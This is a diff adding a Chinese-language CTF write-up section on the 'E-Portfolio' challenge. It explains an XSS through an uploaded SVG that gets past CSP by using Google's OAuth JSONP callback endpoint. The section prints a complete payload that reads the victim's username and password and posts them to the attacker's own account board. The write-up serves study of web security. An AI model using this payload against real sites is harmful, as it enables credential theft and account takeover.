@@ -258,6 +258,59 @@ if you want to steal cookie
 ### 插曲 
 有人直接使用admin/admin登入，所以http://url/share?username=admin，就有一堆假FLAG
 
+
+## E-Portfolio (事後解)
+
+關鍵點 : 用 svg 圖片進行 XSS / CSP JSONP
+
+網站有設定DOMPurify.sanitize以及X-Xss-Protection等
+
+其中可以使用 google 的 jsonp  ```https://accounts.google.com/o/oauth2/revoke?callback=``` 
+可以參考 [JSONBEE](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)
+
+![](https://i.imgur.com/SGkC8hs.png)
+
+其中因為有些字元會被encode或閉合，像是 ``` " > ``` 之類的
+
+下方的程式過程是:
+1. 先透過```/api/portfolio```取得FLAG
+2. 使用```/api/login```登入自己的帳號
+3. 將帳號密碼寫入到自己的布告欄上
+
+```
+<svg xmlns="http://www.w3.org/2000/svg">
+	<script href="https://accounts.google.com/o/oauth2/revoke?callback=fetch('/api/portfolio').then(function (r)
+{ return r.json() }).then(function (t) 
+{ const USERAAA = (t.data.username);const PASSBBB = (t.data.password);
+fetch('/api/login', {
+    'headers': {
+      'content-type': 'application/json',
+    },
+    'referrer': 'http://127.0.0.1:1234/login',
+    'referrerPolicy': 'strict-origin-when-cross-origin',
+    'body': JSON.stringify({ username:'test', password: 'test' }),
+    'method': 'POST',
+    'mode': 'cors',
+    'credentials': 'include'
+  }).then(function(z)
+  { const formData = new FormData();
+	const leak = USERAAA.concat(PASSBBB);
+    formData.append('about', leak);
+  fetch('/api/portfolio', {
+    'referrer': 'http://127.0.0.1:1234/portfolio',
+    'referrerPolicy': 'strict-origin-when-cross-origin',
+    'body': formData,
+    'method': 'PUT',
+    'mode': 'cors',
+    'credentials': 'include'
+  })})})"></script>
+</svg>
+```
+
+效果大概是這樣
+
+![](https://i.imgur.com/OnBdVTc.png)
+
 ## Gitly
 一個Gitly網頁
 ![](https://i.imgur.com/3IsmsMV.png)
